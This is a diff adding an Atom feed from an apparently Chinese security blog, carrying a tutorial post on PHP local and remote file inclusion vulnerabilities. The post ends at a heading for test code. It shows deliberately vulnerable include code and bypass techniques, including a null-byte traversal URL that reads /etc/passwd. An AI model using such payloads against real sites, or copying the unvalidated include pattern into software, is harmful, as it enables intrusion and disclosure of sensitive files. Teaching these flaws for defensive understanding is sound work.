@@ -1,0 +1,734 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://Or0kit.github.io</id>
+    <title>Or0kit • Posts by &#34;文件包含&#34; tag</title>
+    <link href="https://Or0kit.github.io" />
+    <updated>2021-01-20T04:12:47.000Z</updated>
+    <category term="Drozer" />
+    <category term="Algolia" />
+    <category term="同义词替换" />
+    <category term="xpath" />
+    <category term="win32api" />
+    <category term="WOW64" />
+    <category term="windows消息机制" />
+    <category term="虚拟内存" />
+    <category term="jsDelivr" />
+    <category term="First blog" />
+    <category term="markdown 学习" />
+    <category term="Android" />
+    <category term="替换密钥" />
+    <category term="数论基础" />
+    <category term="ADB" />
+    <category term="雷电模拟器" />
+    <category term="Hadoop" />
+    <category term="IDA" />
+    <category term="Windows逆向" />
+    <category term="SSH隧道" />
+    <category term="url" />
+    <category term="http" />
+    <category term="Nginx" />
+    <category term="Linux" />
+    <category term="CentOS7配置vsftp" />
+    <category term="Psad" />
+    <category term="fwsnort" />
+    <category term="应急响应" />
+    <category term="x86汇编指令" />
+    <category term="逆向" />
+    <category term="IDA学习" />
+    <category term="恶意代码分析实战入门" />
+    <category term="静态分析基础" />
+    <category term="动态分析技术基础" />
+    <category term="加壳" />
+    <category term="脱壳" />
+    <category term="C++壳" />
+    <category term="ESP寻址" />
+    <category term="定位Win32窗口回调函数" />
+    <category term="HOOK攻防" />
+    <category term="瞬时HOOK过检测" />
+    <category term="INLINE-HOOK" />
+    <category term="IAT HOOK" />
+    <category term="INLINE HOOK" />
+    <category term="进程监控" />
+    <category term="模块隐藏" />
+    <category term="进程通信" />
+    <category term="tlhelp32.h" />
+    <category term="进程遍历" />
+    <category term="模块遍历" />
+    <category term="TEB" />
+    <category term="PEB" />
+    <category term="R3层断链" />
+    <category term="外挂原理" />
+    <category term="DLL注入之进程间通信" />
+    <category term="Win临界区" />
+    <category term="Win互斥体" />
+    <category term="内存映射文件" />
+    <category term="内存映射共享" />
+    <category term="写拷贝" />
+    <category term="Win事件" />
+    <category term="线程同步" />
+    <category term="Win子窗口控件" />
+    <category term="win32文件函数" />
+    <category term="代码注入" />
+    <category term="窗口程序" />
+    <category term="消息机制" />
+    <category term="消息类型" />
+    <category term="私有内存" />
+    <category term="共享内存" />
+    <category term="设备对象" />
+    <category term="DC设备上下文" />
+    <category term="图形对象" />
+    <category term="创建线程" />
+    <category term="线程控制" />
+    <category term="线程相关API" />
+    <category term="线程上下文" />
+    <category term="CONTEXT结构体" />
+    <category term="物理内存" />
+    <category term="Windows进程" />
+    <category term="句柄表" />
+    <category term="远程线程函数" />
+    <category term="远程线程" />
+    <category term="DLL注入" />
+    <category term="DLL注入相关函数" />
+    <category term="WinMain函数" />
+    <category term="调用约定" />
+    <category term="我的GetProcAddress" />
+    <category term="资源文件" />
+    <category term="消息断点" />
+    <category term="通用控件" />
+    <category term="WM_NOTIFY消息类型" />
+    <category term="MFC" />
+    <category term="PE查看器" />
+    <category term="PE课后作业" />
+    <category term="RVA与FOA" />
+    <category term="PE结构" />
+    <category term="DOS头属性说明" />
+    <category term="标准PE头属性说明" />
+    <category term="扩展PE头属性说明" />
+    <category term="节表属性说明" />
+    <category term="空白区添加代码" />
+    <category term="合并节" />
+    <category term="导入表" />
+    <category term="注入" />
+    <category term="导入表注入" />
+    <category term="导出表" />
+    <category term="新增节" />
+    <category term="移动NT头" />
+    <category term="扩大节" />
+    <category term="移动导出表" />
+    <category term="移动重定位表" />
+    <category term="重定位表" />
+    <category term="静态链接库" />
+    <category term="动态链接库" />
+    <category term="句柄" />
+    <category term="button" />
+    <category term="单选框" />
+    <category term="复选框件" />
+    <category term="Edit" />
+    <category term="Combo Box" />
+    <category term="Tab" />
+    <category term="ListCtrl" />
+    <category term="MFC的本质" />
+    <category term="MFC的层次结构图" />
+    <category term="手动创建一个MFC程序" />
+    <category term="MFC的初始化过程" />
+    <category term="MFC运行时类型识别" />
+    <category term="关键字static" />
+    <category term="关键字const" />
+    <category term="MFC动态创建" />
+    <category term="MFC消息映射" />
+    <category term="结构体AFX_MSGMAP_ENTRY" />
+    <category term="结构体AFX_MSGM" />
+    <category term="MFC的三大类消息" />
+    <category term="数据传输" />
+    <category term="ini文件的读写" />
+    <category term="python" />
+    <category term="SSH" />
+    <category term="python文件读取" />
+    <category term="数据分析" />
+    <category term="socket" />
+    <category term="数据库编程" />
+    <category term="python内置属性" />
+    <category term="multiprocessing" />
+    <category term="threading" />
+    <category term="scrapy" />
+    <category term="测试" />
+    <category term="BHP" />
+    <category term="Python的import功能" />
+    <category term="木马" />
+    <category term="STL" />
+    <category term="Vector容器" />
+    <category term="Deque容器" />
+    <category term="List容器" />
+    <category term="Set容器" />
+    <category term="Multiset容器" />
+    <category term="Map容器" />
+    <category term="Multimap容器" />
+    <category term="Stack容器" />
+    <category term="Queue容器" />
+    <category term="STL算法" />
+    <category term="STL迭代器" />
+    <category term="CobaltStrike" />
+    <category term="RedTeam" />
+    <category term="Apeache" />
+    <category term="Nmap" />
+    <category term="php" />
+    <category term="guestbook" />
+    <category term="SQLmap" />
+    <category term="apache" />
+    <category term="log" />
+    <category term="mysql主键" />
+    <category term="CSRF" />
+    <category term="SSRF" />
+    <category term="业务逻辑漏洞" />
+    <category term="xss" />
+    <category term="webshell流量特征" />
+    <category term="虚拟网卡" />
+    <category term="0环与3环的通信（常规方法）" />
+    <category term="内核空间" />
+    <category term="内核模块" />
+    <category term="遍历内核模块" />
+    <category term="定位未导出函数PspTiminateProcess" />
+    <category term="内核编程基础" />
+    <category term="ANSI_STRING" />
+    <category term="UNICODE_STRING" />
+    <category term="内核内存" />
+    <category term="上下文环境" />
+    <category term="中断请求级别" />
+    <category term="链表" />
+    <category term="自旋锁" />
+    <category term="注册表" />
+    <category term="地址空间" />
+    <category term="文件操作" />
+    <category term="线程与事件" />
+    <category term="内核重载" />
+    <category term="驱动调试" />
+    <category term="配置VS2019+WDK10" />
+    <category term="第一个驱动程序" />
+    <category term="调试驱动程序" />
+    <category term="OpenSCManager" />
+    <category term="CreateService" />
+    <category term="APC的本质" />
+    <category term="APC的备用队列" />
+    <category term="消息队列" />
+    <category term="PsConvertToGuiThread" />
+    <category term="win32k.sys" />
+    <category term="GUI线程" />
+    <category term="窗口程序的创建" />
+    <category term="消息循环" />
+    <category term="线性地址的管理" />
+    <category term="VAD树" />
+    <category term="_MMVAD" />
+    <category term="_MMVAD_FLAGS" />
+    <category term="VirtualAlloc" />
+    <category term="MEM_COMMIT与MEM_RESERVE" />
+    <category term="malloc" />
+    <category term="堆内存" />
+    <category term="栈内存" />
+    <category term="全局区内存" />
+    <category term="共享物理页" />
+    <category term="共享文件" />
+    <category term="LoadLibrary的本质" />
+    <category term="MmAddPhysicalMemoryEx" />
+    <category term="缺页异常" />
+    <category term="临界区" />
+    <category term="KPCR结构体" />
+    <category term="等待链表" />
+    <category term="调度链表" />
+    <category term="模拟线程切换" />
+    <category term="模拟挂起与恢复函数" />
+    <category term="进程的创建" />
+    <category term="获取当前进程" />
+    <category term="ETHREAD" />
+    <category term="KTHREAD" />
+    <category term="EPROCESS" />
+    <category term="KPROCESS" />
+    <category term="2-9-9-12分页" />
+    <category term="PAE" />
+    <category term="PDPTE" />
+    <category term="PDE" />
+    <category term="PTE" />
+    <category term="XD标志位" />
+    <category term="逆向分析MmIsAddressValid函数(2-9-9-12)" />
+    <category term="PWT" />
+    <category term="PDT" />
+    <category term="TLB" />
+    <category term="CPU缓存" />
+    <category term="INVLPG指令" />
+    <category term="全局页" />
+    <category term="ShadowWalker" />
+    <category term="中断" />
+    <category term="异常" />
+    <category term="CLI指令" />
+    <category term="STI指令" />
+    <category term="INT2" />
+    <category term="INT8" />
+    <category term="中断门描述符" />
+    <category term="IDT" />
+    <category term="提权" />
+    <category term="TSS" />
+    <category term="跨段跳转流程" />
+    <category term="JMP FAR指令" />
+    <category term="任务门" />
+    <category term="LDT段描述符" />
+    <category term="LDT" />
+    <category term="CR0" />
+    <category term="CR2" />
+    <category term="CR4" />
+    <category term="CRL" />
+    <category term="DPL" />
+    <category term="RPL" />
+    <category term="段寄存器结构" />
+    <category term="段描述符" />
+    <category term="段选择子" />
+    <category term="GDT表" />
+    <category term="调用门" />
+    <category term="调用门描述符" />
+    <category term="逆向分析MmIsAddressValid函数" />
+    <category term="error C2143" />
+    <category term="error C2275" />
+    <category term="CALL与CALL FAR" />
+    <category term="陷阱门描述符" />
+    <category term="页目录表基址" />
+    <category term="页表的基址" />
+    <category term="0地址执行ShellCode" />
+    <category term="10-10-12分页" />
+    <category term="PDE_PTE" />
+    <category term="物理页" />
+    <category term="SSDT HOOK" />
+    <category term="OpenProcess" />
+    <category term="系统服务表" />
+    <category term="SSDT" />
+    <category term="SSDT HOOK隐藏" />
+    <category term="API进出内核" />
+    <category term="系统调用阶段总结" />
+    <category term="网络安全法" />
+    <category term="ASCII" />
+    <category term="GBK" />
+    <category term="ANSI" />
+    <category term="Unicode" />
+    <category term="UTF-8" />
+    <category term="URL 编码/解码" />
+    <category term="十进制" />
+    <category term="二进制" />
+    <category term="十六进制" />
+    <category term="内存" />
+    <category term="编写ShellCode实现IAT HOOK" />
+    <category term="ShellCode原则" />
+    <category term="傀儡进程加密壳" />
+    <category term="ZwUnmapViewOfSection函数" />
+    <category term="加载图标" />
+    <category term="提取图标" />
+    <category term="资源表" />
+    <category term="MFC命令传递" />
+    <category term="远控界面编写" />
+    <category term="HTML" />
+    <category term="文件包含" />
+    <category term="sql注入" />
+    <category term="经典定长指令" />
+    <category term="经典变长指令" />
+    <category term="指令前缀" />
+    <category term="进程句柄表" />
+    <category term="全局句柄表" />
+    <category term="KAPC" />
+    <category term="QueueUserAPC" />
+    <category term="NtQueueApcThread" />
+    <category term="KeInitializeApc" />
+    <category term="KeInsertQueueApc" />
+    <category term="KiInsertQueueApc" />
+    <category term="消息队列与线程" />
+    <category term="Windows线程切换" />
+    <category term="KiSwapContext" />
+    <category term="SwapContext" />
+    <category term="时钟中断" />
+    <category term="时间片管理" />
+    <category term="线程切换与TSS" />
+    <category term="线程切换与FS" />
+    <category term="线程切换与线程优先级" />
+    <category term="快速调用" />
+    <category term="中断调用" />
+    <category term="分析ReadProcessMemory" />
+    <category term="KiFastSystemCall" />
+    <category term="KiIntSystemCall" />
+    <category term="重写3环" />
+    <category term="文件上传" />
+    <category term="隐藏驱动" />
+    <category term="IopLoadDriver" />
+    <category term="延迟过程调用" />
+    <category term="进程挂靠" />
+    <category term="跨进程读写内存" />
+    <category term="APC" />
+    <category term="逆向分析NtReadVirtualMemory" />
+    <category term="逆向分析NtWriteVIrtualMemory" />
+    <category term="AD-Attack-Defense" />
+    <category term="payload" />
+    <category term="sysenter指令" />
+    <category term="KiFastCallEntry函数" />
+    <category term="KiSystemService函数" />
+    <category term="Trap_Frame" />
+    <category term="web安全" />
+    <category term="Pentest" />
+    <entry>
+        <id>https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
+        <title>web漏洞-文件包含</title>
+        <link rel="alternate" href="https://or0kit.github.io/PenetrationTest/Web-Security/web%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+        <content type="html">&lt;h1 id=&#34;文件包含漏洞简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文件包含漏洞简介&#34;&gt;#&lt;/a&gt; 文件包含漏洞简介&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;什么是文件包含漏洞？&lt;br /&gt;
+程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件包含漏洞的成因&lt;br /&gt;
+随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为&lt;ins class=&#34;primary&#34;&gt;变量&lt;/ins&gt;，用来进行动态调用，用户可以对&lt;ins class=&#34;primary&#34;&gt;变量的值可控&lt;/ins&gt;而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在 PHP 语言中。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;php 中常见包含文件的函数
+&lt;ul&gt;
+&lt;li&gt;include () 当使用该函数包含文件时，只有代码执行到 include () 函数时才将文件包含进来，发生错误时之给出一个警告，继续&lt;ins class=&#34;primary&#34;&gt;向下执行&lt;/ins&gt;。&lt;/li&gt;
+&lt;li&gt;include_once () 功能与 Include () 相同，区别在于当重复调用同一文件时，&lt;ins class=&#34;primary&#34;&gt;程序只调用一次&lt;/ins&gt;&lt;/li&gt;
+&lt;li&gt;require () require () 与 include () 的区别在于 require () 执行如果发生错误，函数会输出错误信息，并&lt;ins class=&#34;primary&#34;&gt;终止脚本的运行&lt;/ins&gt;。&lt;/li&gt;
+&lt;li&gt;require_once () 功能与 require () 相同，区别在于当重复调用同一文件时，&lt;ins class=&#34;primary&#34;&gt;程序只调用一次&lt;/ins&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件包含漏洞的分类&lt;/p&gt;
+&lt;p&gt;文件包含漏洞可以分为 RFI (远程文件包含) 和 LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是 php.ini 中是否开启了 allow_url_include。如果开启 了我们就有可能包含远程文件。&lt;/p&gt;
+&lt;p&gt;1、本地文件包含 LFI (Local File Include)&lt;/p&gt;
+&lt;p&gt;2、远程文件包含 RFI (Remote File Include)（需要 php.ini 中 allow_url_include=on、allow_url_fopen = On）&lt;/p&gt;
+&lt;p&gt;在 php.ini 中，allow_url_fopen 默认一直是 On，而 allow_url_include 从 php5.2 之后就默认为 Off。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;文件包含漏洞的危害&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;配合文件上传漏洞 GetShell&lt;/li&gt;
+&lt;li&gt;可以执行任意脚本代码&lt;/li&gt;
+&lt;li&gt;网站源码文件以及配置文件泄露&lt;/li&gt;
+&lt;li&gt;远程包含 GetShell&lt;/li&gt;
+&lt;li&gt;控制整个网站甚至是服务器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;常见漏洞环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见漏洞环境&#34;&gt;#&lt;/a&gt; 常见漏洞环境&lt;/h1&gt;
+&lt;p&gt;了解这些主要是为了绕过&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;span&gt;示例&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;page&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;./action/show.php&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;本地文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#本地文件包含&#34;&gt;#&lt;/a&gt; 本地文件包含&lt;/h1&gt;
+&lt;h2 id=&#34;无限制本地文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无限制本地文件包含&#34;&gt;#&lt;/a&gt; 无限制本地文件包含&lt;/h2&gt;
+&lt;p&gt;这种直接找我们到需要的文件路径，进行包含就行。&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label&#34;&gt;示例&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;有限制本地文件包含&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#有限制本地文件包含&#34;&gt;#&lt;/a&gt; 有限制本地文件包含&lt;/h2&gt;
+&lt;p&gt;这种类型需要我们找到的敏感文件路径，然后&lt;ins class=&#34;info&#34;&gt;绕过限制&lt;/ins&gt;进行包含就行。&lt;/p&gt;
+&lt;h3 id=&#34;00截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#00截断&#34;&gt;#&lt;/a&gt; %00 截断&lt;/h3&gt;
+&lt;p&gt;条件：magic_quotes_gpc = Off php 版本 &amp;lt; 5.3.4&lt;/p&gt;
+&lt;p&gt;在上面常见环境代码的后两种都得用 %00 截断&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;label warning&#34;&gt;示例&lt;/span&gt;&lt;br /&gt;
+ &lt;code&gt;http://www.xxx.com/xx.php?filename=../../etc/passwd%00&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;路径长度截断&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路径长度截断&#34;&gt;#&lt;/a&gt; 路径长度截断&lt;/h3&gt;
+&lt;p&gt;条件：windows OS，点号需要长于 256；linux OS 长于 4096&lt;/p&gt;
+&lt;p&gt;Windows 下目录最大长度为 256 字节，超出的部分会被丢弃；&lt;/p&gt;
+&lt;p&gt;Linux 下目录最大长度为 4096 字节，超出的部分会被丢弃。&lt;/p&gt;
+&lt;p&gt;测试代码：&lt;/p&gt;
